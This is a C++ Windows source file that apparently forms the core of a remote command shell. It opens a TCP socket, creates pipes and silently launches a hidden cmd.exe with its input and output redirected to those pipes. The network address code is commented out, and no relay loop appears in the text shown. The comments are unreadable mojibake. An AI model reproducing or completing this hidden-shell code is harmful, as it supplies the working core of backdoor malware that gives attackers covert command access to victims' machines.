
#include "stdafx.h"
#include "function.h"
#include <winsock2.h>
#include <windows.h>

//ͷ�ļ�


//���ļ�
#pragma comment  (lib,"ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
HANDLE HMR;
HANDLE HMW;
HANDLE HCR;
HANDLE HCW;

SOCKET s;

int InitSocket() {
	//windows�����⣬��Ҫ��������api����������ĳ�ʼ���ͷ���ʼ��
	WORD wVersionRequsted;
	WSADATA wsaData;
	int err;
	wVersionRequsted = MAKEWORD(2, 2);
	//��ʼ������
	err = WSAStartup(wVersionRequsted, &wsaData);
	if (err != 0)
	{
		return 0;
	}

	//1.socket   ����һ���׽���     ���������ɹܵ���pipe��������ں��������ݴ���ӿڣ� 
	s = socket(
		AF_INET,//TNETЭ���
		SOCK_STREAM,//��ʾʹ�õ���TCPЭ��
		0);
	if (s == INVALID_SOCKET) {
		return 0;
	}

	//sockaddr s;//���� ����IP�Ͷ˿ڵĽṹ�壬�����ã���Ϊ��һ������
/*	sockaddr_in  addr;//�����滻socketaddr�ṹ�壬���ߴ�Сһ��
	int  nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;//д��
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//�̶���·����д����ip�򱾵�ip 127.0.0.1
	addr.sin_port = htons(10087);//h:host to  n:network short //�ӣ������ֽ��򣨴�β��ʽ���ͱ����ֽ���(Сβ��ʽ)
	*/
	return 1;
}
int Initcmd()
{
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	BOOL sj = CreatePipe(&HCR, &HMW, &sa, 0);
	if (!sj)
	{
		OutputDebugStringA("createpipe error");
		return 0;
	}
	sj = CreatePipe(&HMR, &HCW, &sa, 0);
	if (!sj)
	{
		OutputDebugStringA("createpipe error");
		return 0;
	}

	//�滻��׼�������
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = HCR;
	si.hStdOutput = HCW;
	si.hStdError = HCW;


	//����cmd����
	sj = CreateProcess(
		_T("C:\\Windows\\System32\\cmd.exe"),//�������ĳ���·�� cmd system32��Ӧ64λ��wow63��Ӧ32λ
		NULL,//�����в�����ֻΪ�����ʿ�д�գ� T(��/c(command ����) calc��),
		NULL,//�̳�����
		NULL,//�̳�����
		TRUE,//�̳п���
		CREATE_NO_WINDOW,//�޴���DEBUG_PROCESS OD������
		NULL,//��������
		NULL,//��ǰ·�� ����˫������ʱ��·�������·����
		&si,//����������ȡ��ַ������ָ��
		&pi
	);
	if (!sj)
	{
		OutputDebugStringA("createprocess error");
		return 0;
	}
	return 1;
}
